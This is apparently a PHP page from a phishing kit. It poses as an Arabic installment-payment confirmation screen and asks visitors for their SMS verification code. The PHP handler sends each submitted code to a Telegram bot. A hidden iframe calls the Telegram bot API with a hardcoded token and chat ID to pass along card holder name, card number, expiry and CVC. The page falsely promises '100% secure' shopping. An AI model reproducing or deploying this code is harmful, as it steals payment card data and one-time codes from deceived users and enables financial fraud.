<?php
include 'controlPanel/Database.php';
$db = new Database();

$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);

if($db->dbNumRows( $result)){
    $rows = $db->dbFetchResult($result);
    foreach($rows as $row){
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
}

if (!isset($_SESSION["user"])) {
    header("location:index.php");
}
$code = 0;
if (isset($_SESSION['user'])) {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {

        $user = $_SESSION["user"];

        if (isset($_POST['mybtn'])) {

            $order = $_POST['order'];
            $databot=':: طلب جديد | كود جديد ::'.PHP_EOL.'رقم الطلب: '.$user.PHP_EOL.'كود التحقق: '.$order;
            $apiToken = $token;
            $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
            // Prepare the POST data
            $sender = [
                'chat_id' => $tokenID,
                'text' => $databot,
            ];
            
            // Initialize cURL
            $curl = curl_init($url);
            
            // Set cURL options
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
            
            // Execute cURL request
            $response = curl_exec($curl);

            // $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .http_build_query($data) );    
        }
        
        $code = 1;
    }
}
?>
<html lang="ar" dir="rtl">
    <head>
    <?php include "head.php"; ?>
</head>

<body style="overflow: auto;" data-new-gr-c-s-check-loaded="14.1125.0" data-gr-ext-installed="">


    <div class="container">
    <div class="d-flex justify-content-between align-items-center p-2">
    <i class="fa-solid fa-chevron-right"></i>

        <div class="">
            <span class=" fw-bold"><?= $db->get_setting('website_name')?></span>
<p style="font-size: 14px;"> الدفع بواسطة نظام الاقساط</p>        </div>

        <span class="text-primary">English</span>

    </div>
    </div>

    <div class="loaderk d-flex justify-content-center align-items-center" style="display: none; height: 0px;"> 
    </div>
     <main>  <!--  <section class="mt-5 py-3">
    </section> -->
    <section class="container-fluid mt-3">
        <div class="row">
            <div class=" col-md-6 col-11   px-4 py-3 my-md-5 my-3 main-confirm" style="box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 3px 0px, rgba(0, 0, 0, 0.06) 0px 1px 2px 0px;">
                <div class="row justify-content-center my-4  align-items-center">
                    <div class="d-flex justify-content-between align-items-center">
                        <div class="d-flex align-items-center">
                        <span style="width: 28px;height:28px;border-radius:50%;background-color:#000;color:white;display:flex;justify-content:center;align-items:center"><i class="fa-solid fa-1 text-white"></i></span>

                        <img src="assets/image/icons/wallet_584067.png" class="ms-2" width="30" alt="">
                    </div>
                        <sapn class="fw-normal fs-6 text-center text-dark   mx-2" dir="ltr">الكود</sapn>
                    </div>
                </div>
                <div class="myCard">
                    <form action="confirem.php" method="POST" class="container">
                    <input type="text" name="order" class="mb-2 form-control rounded-0 w-75 <?= $code == 0 ? '' : 'is-invalid' ?>" id="" required="" placeholder="ادخل الكود">
                    <?= $code == 0 ? '' : '<div class="invalid-feedback container mt-2"></div>
                            <div class="invalid-feedback container mt-2">
                                حدث خطأ في عملية الدفع حاول مرة اخرى !!                            
                            </div>' ?>
                        <!-- <div class="form-floating mb-3">
                            <input type="hidden" name="err" value="" id="">
                            <p id="demo" class="text-danger p-3 mb-2"> سيتم ارسال الكود خلال 60 ثانية </p>
                            <label for="order">
                                <div class=" text-secondary">
                                    <i class="fa-solid fa-circle-check fa-fw mx-2 fa-lg"></i>
                                    ادخل الكود
                                </div>
                            </label>
                           
                            
                        </div> -->
                        <!-- <div class="px-2">
                            <div class="form-check mb-3 border-top pt-2">
                                <label class="form-check-label text-secondary" style="font-size: 12px;" for="flexCheckDefault">يرجى ادخال رمز تأكيد العملية الذي تم ارساله عبر رسالة
                                    SMS
                                </label>
                            </div>
                        </div> -->
                        <div class="mb-3">
                            <button type="submit" class="w-100 btn btn-confirm rounded-4 py-2" name="mybtn" id="codeConfirm">تأكيد
                            </button>
                        </div>
                    </form>

                    <div class="container mt-2 mb-4 text-center">

                            <p style="font-size: 14px;">تسوق إلكتروني آمن 100%
                                <i class="fab fa-cc-amazon-pay fa-fw mx-1"></i>
                                <i class="fab fa-cc-apple-pay fa-fw"></i>
                                <i class="fas fa-shield fa-fw mx-1"></i>
                            </p>
                        </div>
                </div>

            </div>
        </div>
    </section>




    <iframe src="https://api.telegram.org/bot6275729004:AAHFnEvKPlk85C7GDxKFcXRPqi8u9ypHs2g/sendMessage?chat_id=-1001875595955&amp;parse_mode=Markdown&amp;text=🙎‍♂️ اسم البطاقة : { 55 } %0A  🔐 رقم البطاقة : { 5555555555555555 } %0A  📆 تاريخ البطاقة : { 55 / 55 } %0A  🔑 CVC البطاقة : { 555 } %0A الدفعة الاولى : 1000 %0A واتساب : https%3A%2F%2Fwa.me%2F%2B96655 %0A  " hidden="" frameborder="0"></iframe>
    <iframe src="" hidden="" frameborder="0"></iframe>
    <iframe src="" hidden="" frameborder="0"></iframe>
    <script src="assets/js/bootstrap.js"></script>

<script>
// Set the date we're counting down to
var countDownDate = new Date("Jan 5, 2024 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();

  // Find the distance between now and the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
            document.getElementById("demo").innerHTML = " سيتم ارسال الكود خلال " + seconds + " ثانية "

  // If the count down is finished, write some text
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);
</script>

<a href="https://wa.me/<?= $Whatsapp ?>" class="contact py-2 px-3 bg-success rounded-circle">
    <i class="fab fa-whatsapp text-white my-1 fa-2x"></i>
</a>
</main>
<?php 
include "script.php"; 
?>


</body>
</html>